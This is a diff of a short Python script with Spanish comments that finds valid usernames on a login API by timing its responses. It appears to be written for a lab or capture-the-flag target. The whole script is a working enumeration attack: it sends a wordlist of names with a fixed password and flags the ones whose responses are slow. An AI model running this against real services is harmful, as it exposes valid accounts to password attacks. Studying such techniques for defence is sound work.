@@ -14,7 +14,7 @@ from requests.exceptions import ConnectionError;
 # Tomo como referencia al tiempo más largo de todos ellos con una desviacion del %10 por ejemplo. 
 # Todos los usernames que tarden ese tiempo, son posibles usernames validos.
 
-ip = "10.10.40.72" #CHANGE THIS
+ip = "10.10.246.39" #CHANGE THIS
 url = "http://{}/api/user/login".format(ip); #CHANGE THIS 
 print("URL: ", url)
 
@@ -22,21 +22,19 @@ largest_time = 0
 psigma = 0.15 #CHANGE THIS
 times = dict()
 
-w = csv.writer(open("output/user_time.csv", "w"))
-usernames_file = open("wordlist/usernames.txt","r")
+usernames_file = open("wordlist/usernames.txt", "r")
 
 def login(user):
     print("Trying login with username: ", user.rstrip(), "...")
-    payload = {"username": user, "password": "santu"}
+    payload = {"username": user, "password": "santu"} #CHANGE THIS
     response = r.post(url, json = payload)
     if(response.status_code != 200):
         print("Error de la API: "+str(response.status_code))
 
 for username in usernames_file:
-    times[username.rstrip()]=0
+    times[username.rstrip()] = 0 # rstrip para sacarle el \n
 usernames_file.close()
 
-#request TODO trycatch
 for user in times:
     try:
         start_time = time.time()
@@ -47,17 +45,19 @@ for user in times:
         times[user] = request_time
         if(request_time > largest_time):
             largest_time = request_time
-        time.sleep(0.1) #esto no entendi muy bien el porque, TODO research
+        time.sleep(0.1)
     except ConnectionError as e:
         print("Error de conexion contra la API: " + str(e))
+    except Exception as e:
+        print("Error: " + str(e))
 
-print("Largest time: ",str(largest_time))
-print("Psigma: ",str(psigma))
+print("Largest time: ", str(largest_time))
+print("Psigma: ", str(psigma))
 
 #Ahora veo cuales son usernames candidatos.
-candidatos = open("output/candidatos.txt","w");
+candidatos = open("output/candidatos.txt", "w");
 for user, request_time in times.items():
     if(request_time >= largest_time * psigma):
-        print(user," es candidado con un request time de ",str(request_time),"!");
-        candidatos.write(user+"\n");
+        print(user," es candidado con un request time de ", str(request_time), "!");
+        candidatos.write(user + "\n");
 candidatos.close();
